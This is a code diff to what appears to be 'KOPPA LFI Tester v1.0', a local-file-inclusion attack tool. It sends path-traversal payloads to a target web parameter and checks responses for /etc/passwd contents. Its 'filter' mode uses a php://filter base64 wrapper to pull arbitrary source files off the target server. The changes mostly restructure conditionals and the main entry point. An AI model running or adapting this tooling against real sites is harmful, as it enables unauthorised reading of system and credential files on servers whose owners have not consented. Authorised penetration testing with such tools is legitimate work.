@@ -14,7 +14,10 @@ fn cmd_scan(url, param) {
     for pay in TRAVERSAL {
         let enc  = encode.url_encode(pay)
         let resp = http.get("{url}?{param}={enc}")
-        if resp.body.contains("root:") or resp.body.contains("bin/bash") {
+        let body = resp.body
+        let has_root = body.contains("root:")
+        let has_bash = body.contains("bin/bash")
+        if has_root or has_bash {
             log.success("[+] LFI confirmed! Payload: {pay}")
             findings.push(report.finding("LFI", "Critical", "Payload: {pay}"))
         }
@@ -27,24 +30,31 @@ fn cmd_filter(url, param, file) {
     log.info("===== PHP Filter Read: {file} =====")
     let pay  = encode.url_encode("php://filter/convert.base64-encode/resource={file}")
     let resp = http.get("{url}?{param}={pay}")
-    if resp.body.len > 10 {
-        let decoded = encode.b64_decode(resp.body.trim())
-        log.success("[+] File contents:\n{decoded}")
-    } else {
+    let body = resp.body
+    if body.len > 10 {
+        let decoded = encode.b64_decode(body)
+        log.success("[+] File contents: {decoded}")
+    }
+    if body.len <= 10 {
         log.warn("[-] Filter read failed")
     }
+}
+
+fn run_lfi(url, param, mode) {
+    if mode == "scan" or not mode { cmd_scan(url, param) }
+    if mode == "filter" { cmd_filter(url, param, __args__[3]) }
+    log.success("LFI test complete!")
 }
 
 fn main() {
     let url   = __args__[0]
     let param = __args__[1]
     let mode  = __args__[2]
+    log.info("===== KOPPA LFI Tester v1.0 =====")
+    if url and param {
+        run_lfi(url, param, mode)
+    }
     if not url or not param {
         log.warn("Usage: koppa run koppa-lfi <url> <param> [scan|filter <file>]")
-        return
     }
-    log.info("===== KOPPA LFI Tester v1.0 =====")
-    if not mode or mode == "scan" { cmd_scan(url, param) }
-    if mode == "filter" { cmd_filter(url, param, __args__[3]) }
-    log.success("LFI test complete!")
 }
